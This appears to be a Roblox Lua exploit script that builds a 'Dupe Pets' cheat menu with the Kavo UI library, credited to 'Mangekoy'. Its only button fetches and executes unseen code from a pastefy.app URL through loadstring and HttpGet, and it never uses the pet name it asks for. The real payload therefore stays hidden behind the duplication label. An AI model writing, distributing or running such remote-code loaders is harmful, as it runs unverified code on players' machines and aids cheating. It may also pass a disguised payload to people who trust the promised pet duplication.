local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
local Window = Library.CreateLib("Dupe Pets", "Serpent")

-- Главная вкладка с кнопкой
local MainTab = Window:NewTab("Dupe Menu")
local DupeSection = MainTab:NewSection("")

-- Создаем кнопку с редактируемым текстом
local DupeButton = DupeSection:NewButton("Write pet name here", "", function()
    loadstring(game:HttpGet("https://pastefy.app/iRFe6rwv/raw"))()
end)

-- Настройка внешнего вида кнопки
DupeButton.Instance.TextSize = 14
DupeButton.Instance.Size = UDim2.new(0, 200, 0, 30)

-- Вкладка с автором
local CreditsTab = Window:NewTab("Info")
CreditsTab:NewSection("Made by Mangekoy | v2")
